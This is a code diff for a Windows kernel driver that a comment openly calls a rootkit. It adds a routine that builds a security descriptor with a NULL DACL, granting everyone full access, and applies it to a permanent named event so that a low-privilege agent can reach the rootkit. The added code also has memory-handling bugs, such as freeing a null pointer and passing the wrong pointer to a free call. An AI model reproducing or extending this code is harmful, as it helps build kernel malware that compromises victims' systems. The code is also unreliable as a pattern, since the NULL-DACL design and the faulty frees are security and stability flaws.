@@ -166,6 +166,71 @@ GetBaseNameFromFullPath(PCHAR FullName)
 }
 
 /**
+ * TODO: description, parameters
+ */
+NTSTATUS
+BeCreateSecurityDescriptor(OUT PSECURITY_DESCRIPTOR* sd)
+{
+    NTSTATUS NtStatus = STATUS_SUCCESS;
+
+    // Create the DACL
+    /*
+     * Figured out that since we want full access to anyone, we can also just add a 0 ACL ... :)
+     */
+    /*
+    ULONG daclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeAuthenticatedUsersSid);
+    PACL Dacl = (PACL)ExAllocatePoolWithTag(NonPagedPool, daclSize, DRIVER_TAG);
+    if (!Dacl)
+    {
+        return STATUS_UNSUCCESSFUL;
+    }
+
+
+    NtStatus = RtlCreateAcl(Dacl, daclSize, ACL_REVISION);
+    if (!NT_SUCCESS(NtStatus))
+    {
+        ExFreePool(Dacl);
+        return NtStatus;
+    }
+
+    NtStatus = RtlAddAccessAllowedAce(Dacl, ACL_REVISION, SECTION_ALL_ACCESS, SeExports->SeAuthenticatedUsersSid);
+    if (!NT_SUCCESS(NtStatus))
+    {
+        ExFreePool(Dacl);
+        return NtStatus;
+    }
+    */
+
+    // Create the security descriptor
+    *sd = (PSECURITY_DESCRIPTOR)ExAllocatePoolWithTag(NonPagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, DRIVER_TAG); // TODO: FREE
+    if (!*sd)
+    {
+        ExFreePool(*sd);
+        // ExFreePool(Dacl);
+        return STATUS_UNSUCCESSFUL;
+    }
+
+    NtStatus = RtlCreateSecurityDescriptor(*sd, SECURITY_DESCRIPTOR_REVISION);
+    if (!NT_SUCCESS(NtStatus))
+    {
+        ExFreePool(sd);
+        // ExFreePool(Dacl);
+        return NtStatus;
+    }
+
+    NtStatus = RtlSetDaclSecurityDescriptor(*sd, TRUE, 0, FALSE); // 0 = Dacl
+    if (!NT_SUCCESS(NtStatus))
+    {
+        LOG_MSG("Failed to set DACL in security descriptor\n");
+        ExFreePool(*sd);
+        // ExFreePool(Dacl);
+        return NtStatus;
+    }
+
+    return NtStatus;
+}
+
+/**
  * Sets a named event to a state
  * 
  * @param hEvent Handle to the event
@@ -272,8 +337,11 @@ BeCreateNamedEvent(PHANDLE phEvent, PUNICODE_STRING EventName, BOOLEAN initialSi
 {
     NTSTATUS status;
 
+    // Add permissions to all users to our event, so that a lowpriv agent can still access the rootkit
+    PSECURITY_DESCRIPTOR sd = { 0 };
+    BeCreateSecurityDescriptor(&sd);
     OBJECT_ATTRIBUTES objAttributes;
-    InitializeObjectAttributes(&objAttributes, EventName, OBJ_OPENIF | OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE, NULL, NULL);
+    InitializeObjectAttributes(&objAttributes, EventName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
 
     status = ZwCreateEvent(phEvent, EVENT_ALL_ACCESS, &objAttributes, NotificationEvent, initialSignaledState);
 
@@ -282,5 +350,6 @@ BeCreateNamedEvent(PHANDLE phEvent, PUNICODE_STRING EventName, BOOLEAN initialSi
         DbgPrint("Failed to create named event: 0x%X\n", status);
     }
 
+    ExFreePool(sd);
     return status;
 }
